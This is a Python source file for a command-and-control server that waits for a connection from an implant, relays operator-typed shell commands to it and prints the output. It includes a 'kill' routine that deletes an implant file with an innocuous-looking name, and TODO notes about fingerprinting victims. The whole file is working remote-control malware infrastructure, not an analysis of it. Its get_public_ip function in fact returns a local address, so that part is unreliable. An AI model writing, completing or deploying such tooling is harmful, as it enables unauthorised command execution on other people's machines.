# c2.py
import socket
import base64
import sys
import time


# Opens connection, sends commands, receives reponses, and prints them to the console
# TODO: save responses (and commands? to database), associate each response with a fingerprint -- might need to pass fingerprint as an argument to implant


def get_public_ip():
    try:
        # Connect to Google's public DNS server.  Doesn't send data, just establishes connection.
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        public_ip = s.getsockname()[0]
        s.close()
        return public_ip
    except socket.error as e:
        print(f"Error getting IP with socket: {e}")
        return None


def c2_server(ip, port):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((ip, port))
        server_socket.listen(1)
        print(f"Server listening on {ip}:{port}...")

        conn, addr = server_socket.accept()
        print(f"Connection established with {addr}")

        while True:
            # TODO: change to use tasks system, mark it with fingerprint, etc

            command = input("Enter command to send to client: ")
            if command.lower() == "exit":
                print("Closing connection...")
                conn.sendall(command.encode())
                break

            elif command.lower() == "kill":
                response = input("Are you sure you want to kill the implant? (y/n): ")
                if response.lower() == "y":
                    command = "rm ~/libutils.go" # TODO: change to correct name


            conn.sendall(command.encode())
            response = conn.recv(4096).decode()
            print(f"Response from client: {response}")

        conn.close()
        server_socket.close()

    except Exception as e:
        print(f"An error occurred: {e}")


    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Closing connection...")
        if 'conn' in locals():
            conn.close()
        server_socket.close()


if __name__ == "__main__":
    IP = get_public_ip()
    PORT = 9999

    c2_server(IP, PORT)    